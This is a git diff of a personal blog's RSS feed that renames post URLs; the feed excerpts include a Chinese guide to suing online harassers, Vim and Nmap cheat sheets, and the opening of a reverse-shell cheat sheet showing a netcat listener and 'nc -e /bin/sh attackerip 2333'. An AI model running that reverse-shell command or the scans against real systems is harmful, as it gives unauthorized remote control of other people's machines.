@@ -1,15 +1,15 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on WhereIsMyMind</title><link>https://hare001.github.io/posts/</link><description>Recent content in Posts on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 14 Jul 2020 13:17:12 +0800</lastBuildDate><atom:link href="https://hare001.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare001.github.io/posts/20200714-how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare001.github.io/posts/20200714-how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了。&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on WhereIsMyMind</title><link>https://hare001.github.io/posts/</link><description>Recent content in Posts on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 14 Jul 2020 13:17:12 +0800</lastBuildDate><atom:link href="https://hare001.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare001.github.io/posts/how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare001.github.io/posts/how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了。&lt;/h2>
 &lt;h3 id="如果你觉得微博上有人肆无忌惮地伤害您您又不知道ta是谁不知怎么告ta一步一步这样做">如果你觉得微博上有人肆无忌惮地伤害您，您又不知道TA是谁、不知怎么告TA，一步一步这样做：&lt;/h3>
 &lt;p>1，找你居住地的公证处，要求公证这些令你觉得受到伤害的帖子。通常大约1000元左右。注意，您要亲自去一下公证处。可以电话预约。保留好发票！有人最后会报销的。&lt;/p>
 &lt;p>居住地的含义是你现在居住的地方而不是户籍地，只需要有暂住证或居住证。&lt;/p>
 &lt;p>2，在你居住地的法院，提交诉讼。诉讼费约50元。如果觉得写诉状头疼，可以延请你信任的任何人，甚至不一定是执业律师。诉讼制度改革后，法院目前对此类诉状基本去了就受理。&lt;/p>
-&lt;p>律师费高低不等，不过不会白花钱的，把发票放好，最后也会有人报销。所以强烈建议找个律师并给予全面授权，他或者她会为您办很多事情，包括并不限于全权代理您出庭，您自己都可以不去。&lt;/p></description></item><item><title>Vim Cheat Sheet</title><link>https://hare001.github.io/posts/20200701-vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare001.github.io/posts/20200701-vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
+&lt;p>律师费高低不等，不过不会白花钱的，把发票放好，最后也会有人报销。所以强烈建议找个律师并给予全面授权，他或者她会为您办很多事情，包括并不限于全权代理您出庭，您自己都可以不去。&lt;/p></description></item><item><title>Vim Cheat Sheet</title><link>https://hare001.github.io/posts/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare001.github.io/posts/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
 &lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
 :sav[eas] 文件名 - 另存为
 :clo[se] - 关闭当前窗口
 :ter[minal] - open a terminal window
 K - 打开光标所在单词的man页面
-&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare001.github.io/posts/20200701-nmap-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare001.github.io/posts/20200701-nmap-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
+&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare001.github.io/posts/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare001.github.io/posts/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
 nmap 192.168.1.1
 &lt;span style="color:#75715e">#Scan a host&lt;/span>
@@ -20,7 +20,7 @@ nmap 192.168.1.1-20
 nmap 192.168.1.0/24
 &lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
 nmap -iL list-of-ips.txt
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare001.github.io/posts/20200630-reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare001.github.io/posts/20200630-reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本：&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
